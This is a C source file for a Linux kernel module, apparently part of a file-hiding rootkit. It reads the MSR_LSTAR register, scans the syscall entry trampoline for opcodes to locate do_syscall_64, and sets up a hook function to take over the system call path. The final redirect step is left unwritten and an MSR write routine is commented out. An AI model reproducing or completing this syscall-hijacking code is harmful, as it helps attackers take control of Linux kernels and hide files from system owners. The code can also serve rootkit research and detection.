#include <linux/kernel.h>
#include <linux/string.h>
#include <asm/nospec-branch.h>
#include <asm/msr-index.h>

#include "filehide_lstar.h"
#include "common.h"

#define SEARCHLEN  512

//Idea: build path from entry_SYSCALL_64_trampoline to do_syscall64 by gathering addresses piece by piece
//(1) JMP_NOSPEC %rdi -> (2) [entry_SYSCALL_64_stage2] jmp entry_SYSCALL_64_after_hwframe -> (3) [entry_SYSCALL_64] call do_syscall_64
//                                     |
//                               can be skipped ============================================>    

//sign-extended mov rdi, imm; 0x48 is REX.W prefix
static const char *movSignExtended = "\x48\xc7\xc7";

//The first call in entry_SYSCALL_64 is the right one, so grabbing it is easy
static const char *callNearRelative = "\xE8";

static unsigned long read_msr(unsigned int);
static inline unsigned long mem_offset(char *ptr);
static char *find_do_syscall_64(char *lstar_addr);

void g7_syscall_64(unsigned long, struct pt_regs *);
void (*do_syscall_64)(unsigned long, struct pt_regs *);

void
test_lstar(void)
{      
    char *syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));

    if(!do_syscall_64 || !syscall_64_ptr)
        return;

    DEBUG_INFO("do_syscall_64 at %lx\n", (unsigned long)do_syscall_64);

    //Calculate new call offset to our function
    
}

//Only use with multiples of 16..
static void
hexdump(char *addr, int n)
{
    int k = 0;

    DEBUG_INFO("Hexdump:\n");
    while(k <= n) {
        DEBUG_INFO("%02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX",
                addr[k], addr[k + 1], addr[k + 2], addr[k + 3], addr[k + 4], addr[k + 5], addr[k + 6], addr[k + 7], addr[k + 8], addr[k + 9], 
                addr[k + 10], addr[k + 11], addr[k + 12], addr[k + 13], addr[k + 14], addr[k + 15]);
        k += 16;
    }
}

static inline long
sign_extend(int n)
{
    if(n & (1 << 31))
        return n |= 0xFFFFFFFF00000000;

    return n;
}

//Get sign-extended 4 byte offset from memory
static inline unsigned long
mem_offset(char *ptr)
{
    unsigned long ret = 0;

    memcpy(&ret, ptr, 4);
    ret = sign_extend(ret);

    //Offset relative to _next_ instruction
    ret += 4;
     
    return ret;
}

//Find do_syscall_64, sets it, and returns the pointer to the original call
static char *
find_do_syscall_64(char *lstar_addr)
{
    //Step 1: get address of stage 2 trampoline
    char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);

    if(!stage2_ptr)
        return NULL;

    unsigned long stage2_addr = mem_offset(stage2_ptr + 3); //3 bytes offset to skip opcode

    //Step 2: conveniently, no 'pointer' chasing is necessary, we can just look for the jump opcode from here
    char *syscall64_call_ptr = strnstr((char *)stage2_addr, callNearRelative, SEARCHLEN);

    if(!syscall64_call_ptr)
        return NULL;

    //Get offset relative to next address
    unsigned long syscall64_off = mem_offset(syscall64_call_ptr + 1); //1 byte offset to skip opcode

    //Store correct address of do_syscall_64
    do_syscall_64 = (void *)syscall64_call_ptr + syscall64_off;

    return syscall64_call_ptr;
}

void
g7_syscall_64(unsigned long nr, struct pt_regs *regs)
{
    do_syscall_64(nr, regs);
}

static unsigned long 
read_msr(unsigned int msr)
{
    unsigned int low, high;

    __asm__ volatile (
                    "movl %[msr], %%ecx\n\t"
                    "rdmsr\n\t"
                    "mov %%eax, %[low]\n\t"
                    "mov %%edx, %[high]"
                    : [low] "=r" (low), [high] "=r" (high)
                    : [msr] "r" (msr)
                    : "ecx", "eax", "edx"
    );

    //Get two 32bit values into a 64bit variable
    unsigned long ret = high;
    ret <<= 32;
    ret |= low;

    return ret;
}

// static void
// write_msr(unsigned int low, unsigned int high, unsigned int msr)
// {
//     __asm__ volatile (
//                     "movl $0xc0000082, %%ecx\n\t"
//                     "mov %[low], %%eax\n\t"
//                     "mov %[high], %%edx\n\t"
//                     "wrmsr"
//                     :
//                     : [low] "r" (low), [high] "r" (high)
//                     : "ecx", "eax", "edx"
//     );
// }